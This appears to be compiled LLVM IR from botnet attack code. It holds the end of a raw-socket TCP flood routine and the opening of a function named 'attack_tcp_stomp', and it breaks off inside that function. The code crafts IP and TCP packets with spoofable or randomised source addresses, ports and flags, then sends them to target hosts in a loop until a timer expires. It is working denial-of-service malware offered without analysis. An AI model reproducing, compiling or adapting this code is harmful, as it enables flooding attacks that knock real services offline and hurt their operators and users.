  %29 = alloca i8, align 1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.tcphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %40 = load i8, i8* %7, align 1
  %41 = zext i8 %40 to i64
  %42 = call noalias align 16 i8* @calloc(i64 %41, i64 8) #4
  %43 = bitcast i8* %42 to i8**
  store i8** %43, i8*** %13, align 8
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 2, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %14, align 1
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 3, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %15, align 2
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 4, i32 64)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %16, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 5, i32 0)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %17, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 6, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %18, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 7, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %19, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 16, i32 65535)
  store i32 %70, i32* %20, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 17, i32 65535)
  store i32 %73, i32* %21, align 4
  %74 = load i8, i8* %9, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 10, i32 0)
  %77 = trunc i32 %76 to i8
  store i8 %77, i8* %22, align 1
  %78 = load i8, i8* %9, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 11, i32 1)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %23, align 1
  %82 = load i8, i8* %9, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 12, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %24, align 1
  %86 = load i8, i8* %9, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 13, i32 0)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %25, align 1
  %90 = load i8, i8* %9, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 14, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %26, align 1
  %94 = load i8, i8* %9, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %96 = call i32 @attack_get_opt_int(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 15, i32 0)
  %97 = trunc i32 %96 to i8
  store i8 %97, i8* %27, align 1
  %98 = load i8, i8* %9, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 0, i32 512)
  store i32 %100, i32* %28, align 4
  %101 = load i8, i8* %9, align 1
  %102 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %103 = call i32 @attack_get_opt_int(i8 zeroext %101, %struct.attack_option* %102, i8 zeroext 1, i32 1)
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* %29, align 1
  %105 = load i8, i8* %9, align 1
  %106 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %107 = load i32, i32* @LOCAL_ADDR, align 4
  %108 = call i32 @attack_get_opt_ip(i8 zeroext %105, %struct.attack_option* %106, i8 zeroext 24, i32 %107)
  store i32 %108, i32* %30, align 4
  %109 = call i64 @time(i64* null) #4
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = add nsw i64 %109, %111
  %113 = trunc i64 %112 to i32
  store i32 %113, i32* %31, align 4
  %114 = call i32 @socket(i32 2, i32 3, i32 6) #4
  store i32 %114, i32* %12, align 4
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %117

116:                                              ; preds = %5
  br label %462

117:                                              ; preds = %5
  store i32 1, i32* %11, align 4
  %118 = load i32, i32* %12, align 4
  %119 = bitcast i32* %11 to i8*
  %120 = call i32 @setsockopt(i32 %118, i32 0, i32 3, i8* %119, i32 4) #4
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %122, label %125

122:                                              ; preds = %117
  %123 = load i32, i32* %12, align 4
  %124 = call i32 @close(i32 %123)
  br label %462

125:                                              ; preds = %117
  store i32 0, i32* %11, align 4
  br label %126

126:                                              ; preds = %289, %125
  %127 = load i32, i32* %11, align 4
  %128 = load i8, i8* %7, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp slt i32 %127, %129
  br i1 %130, label %131, label %292

131:                                              ; preds = %126
  %132 = call noalias align 16 i8* @calloc(i64 1510, i64 1) #4
  %133 = load i8**, i8*** %13, align 8
  %134 = load i32, i32* %11, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8*, i8** %133, i64 %135
  store i8* %132, i8** %136, align 8
  %137 = load i8**, i8*** %13, align 8
  %138 = load i32, i32* %11, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds i8*, i8** %137, i64 %139
  %141 = load i8*, i8** %140, align 8
  %142 = bitcast i8* %141 to %struct.iphdr*
  store %struct.iphdr* %142, %struct.iphdr** %32, align 8
  %143 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i64 1
  %145 = bitcast %struct.iphdr* %144 to %struct.tcphdr*
  store %struct.tcphdr* %145, %struct.tcphdr** %33, align 8
  %146 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %147 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %146, i64 1
  %148 = bitcast %struct.tcphdr* %147 to i8*
  store i8* %148, i8** %34, align 8
  %149 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = and i8 %151, 15
  %153 = or i8 %152, 64
  store i8 %153, i8* %150, align 4
  %154 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %155 = bitcast %struct.iphdr* %154 to i8*
  %156 = load i8, i8* %155, align 4
  %157 = and i8 %156, -16
  %158 = or i8 %157, 5
  store i8 %158, i8* %155, align 4
  %159 = load i8, i8* %14, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 1
  store i8 %159, i8* %161, align 1
  %162 = load i32, i32* %28, align 4
  %163 = sext i32 %162 to i64
  %164 = add i64 40, %163
  %165 = trunc i64 %164 to i16
  %166 = call zeroext i16 @htons(i16 zeroext %165) #5
  %167 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 2
  store i16 %166, i16* %168, align 2
  %169 = load i16, i16* %15, align 2
  %170 = call zeroext i16 @htons(i16 zeroext %169) #5
  %171 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 3
  store i16 %170, i16* %172, align 4
  %173 = load i8, i8* %16, align 1
  %174 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 5
  store i8 %173, i8* %175, align 4
  %176 = load i8, i8* %17, align 1
  %177 = icmp ne i8 %176, 0
  br i1 %177, label %178, label %182

178:                                              ; preds = %131
  %179 = call zeroext i16 @htons(i16 zeroext 16384) #5
  %180 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 4
  store i16 %179, i16* %181, align 2
  br label %182

182:                                              ; preds = %178, %131
  %183 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 6
  store i8 6, i8* %184, align 1
  %185 = load i32, i32* %30, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 8
  store i32 %185, i32* %187, align 4
  %188 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %189 = load i32, i32* %11, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %188, i64 %190
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i32 0, i32 1
  %193 = load i32, i32* %192, align 4
  %194 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 9
  store i32 %193, i32* %195, align 4
  %196 = load i16, i16* %18, align 2
  %197 = call zeroext i16 @htons(i16 zeroext %196) #5
  %198 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 0
  store i16 %197, i16* %199, align 4
  %200 = load i16, i16* %19, align 2
  %201 = call zeroext i16 @htons(i16 zeroext %200) #5
  %202 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 1
  store i16 %201, i16* %203, align 2
  %204 = load i32, i32* %20, align 4
  %205 = trunc i32 %204 to i16
  %206 = call zeroext i16 @htons(i16 zeroext %205) #5
  %207 = zext i16 %206 to i32
  %208 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 2
  store i32 %207, i32* %209, align 4
  %210 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 4
  %212 = load i16, i16* %211, align 4
  %213 = and i16 %212, -241
  %214 = or i16 %213, 80
  store i16 %214, i16* %211, align 4
  %215 = load i8, i8* %22, align 1
  %216 = sext i8 %215 to i16
  %217 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %216, 1
  %221 = shl i16 %220, 13
  %222 = and i16 %219, -8193
  %223 = or i16 %222, %221
  store i16 %223, i16* %218, align 4
  %224 = load i8, i8* %23, align 1
  %225 = sext i8 %224 to i16
  %226 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %225, 1
  %230 = shl i16 %229, 12
  %231 = and i16 %228, -4097
  %232 = or i16 %231, %230
  store i16 %232, i16* %227, align 4
  %233 = load i8, i8* %24, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 11
  %240 = and i16 %237, -2049
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %25, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 10
  %249 = and i16 %246, -1025
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8, i8* %26, align 1
  %252 = sext i8 %251 to i16
  %253 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 4
  %255 = load i16, i16* %254, align 4
  %256 = and i16 %252, 1
  %257 = shl i16 %256, 9
  %258 = and i16 %255, -513
  %259 = or i16 %258, %257
  store i16 %259, i16* %254, align 4
  %260 = load i8, i8* %27, align 1
  %261 = sext i8 %260 to i16
  %262 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %263 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %262, i32 0, i32 4
  %264 = load i16, i16* %263, align 4
  %265 = and i16 %261, 1
  %266 = shl i16 %265, 8
  %267 = and i16 %264, -257
  %268 = or i16 %267, %266
  store i16 %268, i16* %263, align 4
  %269 = call i32 @rand_next()
  %270 = and i32 %269, 65535
  %271 = trunc i32 %270 to i16
  %272 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %273 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %272, i32 0, i32 5
  store i16 %271, i16* %273, align 2
  %274 = load i8, i8* %24, align 1
  %275 = icmp ne i8 %274, 0
  br i1 %275, label %276, label %282

276:                                              ; preds = %182
  %277 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %278 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = and i16 %279, -2049
  %281 = or i16 %280, 2048
  store i16 %281, i16* %278, align 4
  br label %282

282:                                              ; preds = %276, %182
  %283 = load i8*, i8** %34, align 8
  %284 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %283, i32 %284)
  %285 = load i8*, i8** %34, align 8
  %286 = load i32, i32* %28, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds i8, i8* %285, i64 %287
  store i8 0, i8* %288, align 1
  br label %289

289:                                              ; preds = %282
  %290 = load i32, i32* %11, align 4
  %291 = add nsw i32 %290, 1
  store i32 %291, i32* %11, align 4
  br label %126, !llvm.loop !9

292:                                              ; preds = %126
  br label %293

293:                                              ; preds = %292, %461
  store i32 0, i32* %11, align 4
  br label %294

294:                                              ; preds = %452, %293
  %295 = load i32, i32* %11, align 4
  %296 = load i8, i8* %7, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp slt i32 %295, %297
  br i1 %298, label %299, label %455

299:                                              ; preds = %294
  %300 = load i8**, i8*** %13, align 8
  %301 = load i32, i32* %11, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds i8*, i8** %300, i64 %302
  %304 = load i8*, i8** %303, align 8
  store i8* %304, i8** %35, align 8
  %305 = load i8*, i8** %35, align 8
  %306 = bitcast i8* %305 to %struct.iphdr*
  store %struct.iphdr* %306, %struct.iphdr** %36, align 8
  %307 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i64 1
  %309 = bitcast %struct.iphdr* %308 to %struct.tcphdr*
  store %struct.tcphdr* %309, %struct.tcphdr** %37, align 8
  %310 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i64 1
  %312 = bitcast %struct.tcphdr* %311 to i8*
  store i8* %312, i8** %38, align 8
  %313 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %314 = load i32, i32* %11, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i64 %315
  %317 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %316, i32 0, i32 2
  %318 = load i8, i8* %317, align 4
  %319 = zext i8 %318 to i32
  %320 = icmp slt i32 %319, 32
  br i1 %320, label %321, label %342

321:                                              ; preds = %299
  %322 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %323 = load i32, i32* %11, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %322, i64 %324
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %325, i32 0, i32 1
  %327 = load i32, i32* %326, align 4
  %328 = call i32 @ntohl(i32 %327) #5
  %329 = call i32 @rand_next()
  %330 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %331 = load i32, i32* %11, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %330, i64 %332
  %334 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %333, i32 0, i32 2
  %335 = load i8, i8* %334, align 4
  %336 = zext i8 %335 to i32
  %337 = lshr i32 %329, %336
  %338 = add i32 %328, %337
  %339 = call i32 @htonl(i32 %338) #5
  %340 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 9
  store i32 %339, i32* %341, align 4
  br label %342

342:                                              ; preds = %321, %299
  %343 = load i32, i32* %30, align 4
  %344 = icmp eq i32 %343, -1
  br i1 %344, label %345, label %349

345:                                              ; preds = %342
  %346 = call i32 @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 8
  store i32 %346, i32* %348, align 4
  br label %349

349:                                              ; preds = %345, %342
  %350 = load i16, i16* %15, align 2
  %351 = zext i16 %350 to i32
  %352 = icmp eq i32 %351, 65535
  br i1 %352, label %353, label %359

353:                                              ; preds = %349
  %354 = call i32 @rand_next()
  %355 = and i32 %354, 65535
  %356 = trunc i32 %355 to i16
  %357 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %358 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %357, i32 0, i32 3
  store i16 %356, i16* %358, align 4
  br label %359

359:                                              ; preds = %353, %349
  %360 = load i16, i16* %18, align 2
  %361 = zext i16 %360 to i32
  %362 = icmp eq i32 %361, 65535
  br i1 %362, label %363, label %369

363:                                              ; preds = %359
  %364 = call i32 @rand_next()
  %365 = and i32 %364, 65535
  %366 = trunc i32 %365 to i16
  %367 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %368 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %367, i32 0, i32 0
  store i16 %366, i16* %368, align 4
  br label %369

369:                                              ; preds = %363, %359
  %370 = load i16, i16* %19, align 2
  %371 = zext i16 %370 to i32
  %372 = icmp eq i32 %371, 65535
  br i1 %372, label %373, label %379

373:                                              ; preds = %369
  %374 = call i32 @rand_next()
  %375 = and i32 %374, 65535
  %376 = trunc i32 %375 to i16
  %377 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 1
  store i16 %376, i16* %378, align 2
  br label %379

379:                                              ; preds = %373, %369
  %380 = load i32, i32* %20, align 4
  %381 = icmp eq i32 %380, 65535
  br i1 %381, label %382, label %386

382:                                              ; preds = %379
  %383 = call i32 @rand_next()
  %384 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 2
  store i32 %383, i32* %385, align 4
  br label %386

386:                                              ; preds = %382, %379
  %387 = load i32, i32* %21, align 4
  %388 = icmp eq i32 %387, 65535
  br i1 %388, label %389, label %393

389:                                              ; preds = %386
  %390 = call i32 @rand_next()
  %391 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %392 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %391, i32 0, i32 3
  store i32 %390, i32* %392, align 4
  br label %393

393:                                              ; preds = %389, %386
  %394 = load i8, i8* %29, align 1
  %395 = icmp ne i8 %394, 0
  br i1 %395, label %396, label %403

396:                                              ; preds = %393
  %397 = load i8*, i8** %38, align 8
  %398 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %397, i32 %398)
  %399 = load i8*, i8** %38, align 8
  %400 = load i32, i32* %28, align 4
  %401 = sext i32 %400 to i64
  %402 = getelementptr inbounds i8, i8* %399, i64 %401
  store i8 0, i8* %402, align 1
  br label %403

403:                                              ; preds = %396, %393
  %404 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 7
  store i16 0, i16* %405, align 2
  %406 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %407 = bitcast %struct.iphdr* %406 to i16*
  %408 = call zeroext i16 @checksum_generic(i16* %407, i32 20)
  %409 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 %408, i16* %410, align 2
  %411 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 6
  store i16 0, i16* %412, align 4
  %413 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %414 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %415 = bitcast %struct.tcphdr* %414 to i8*
  %416 = load i32, i32* %28, align 4
  %417 = sext i32 %416 to i64
  %418 = add i64 20, %417
  %419 = trunc i64 %418 to i16
  %420 = call zeroext i16 @htons(i16 zeroext %419) #5
  %421 = load i32, i32* %28, align 4
  %422 = sext i32 %421 to i64
  %423 = add i64 20, %422
  %424 = trunc i64 %423 to i32
  %425 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %413, i8* %415, i16 zeroext %420, i32 %424)
  %426 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %427 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %426, i32 0, i32 6
  store i16 %425, i16* %427, align 4
  %428 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 1
  %430 = load i16, i16* %429, align 2
  %431 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %432 = load i32, i32* %11, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i64 %433
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i32 0, i32 0
  %436 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %435, i32 0, i32 1
  store i16 %430, i16* %436, align 2
  %437 = load i32, i32* %12, align 4
  %438 = load i8*, i8** %35, align 8
  %439 = load i32, i32* %28, align 4
  %440 = sext i32 %439 to i64
  %441 = add i64 40, %440
  %442 = bitcast %union.__CONST_SOCKADDR_ARG* %39 to %struct.sockaddr**
  %443 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %444 = load i32, i32* %11, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i64 %445
  %447 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i32 0, i32 0
  %448 = bitcast %struct.sockaddr_in* %447 to %struct.sockaddr*
  store %struct.sockaddr* %448, %struct.sockaddr** %442, align 8
  %449 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %39, i32 0, i32 0
  %450 = load %struct.sockaddr*, %struct.sockaddr** %449, align 8
  %451 = call i64 @sendto(i32 %437, i8* %438, i64 %441, i32 16384, %struct.sockaddr* %450, i32 16)
  br label %452

452:                                              ; preds = %403
  %453 = load i32, i32* %11, align 4
  %454 = add nsw i32 %453, 1
  store i32 %454, i32* %11, align 4
  br label %294, !llvm.loop !10

455:                                              ; preds = %294
  %456 = call i64 @time(i64* null) #4
  %457 = load i32, i32* %31, align 4
  %458 = sext i32 %457 to i64
  %459 = icmp sgt i64 %456, %458
  br i1 %459, label %460, label %461

460:                                              ; preds = %455
  br label %462

461:                                              ; preds = %455
  br label %293

462:                                              ; preds = %116, %122, %460
  ret void
}

declare void @rand_alphastr(i8*, i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @attack_tcp_stomp(i32 %0, i8 zeroext %1, %struct.attack_target* %2, i8 zeroext %3, %struct.attack_option* %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_stomp_data*, align 8
  %14 = alloca i8**, align 8
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  %19 = alloca i16, align 2
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.sockaddr_in, align 4
  %31 = alloca %struct.sockaddr_in, align 4
  %32 = alloca i32, align 4
  %33 = alloca [256 x i8], align 16
  %34 = alloca i64, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %36 = alloca i32, align 4
  %37 = alloca %union.__SOCKADDR_ARG, align 8
  %38 = alloca %struct.tcphdr*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.tcphdr*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %struct.iphdr*, align 8
  %44 = alloca %struct.tcphdr*, align 8
  %45 = alloca i8*, align 8
  %46 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %47 = load i8, i8* %7, align 1
  %48 = zext i8 %47 to i64
  %49 = call noalias align 16 i8* @calloc(i64 %48, i64 16) #4
  %50 = bitcast i8* %49 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %50, %struct.attack_stomp_data** %13, align 8
  %51 = load i8, i8* %7, align 1
  %52 = zext i8 %51 to i64
  %53 = call noalias align 16 i8* @calloc(i64 %52, i64 8) #4
  %54 = bitcast i8* %53 to i8**
  store i8** %54, i8*** %14, align 8
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 2, i32 0)
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %15, align 1
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 3, i32 65535)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %16, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 4, i32 64)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %17, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 5, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %18, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
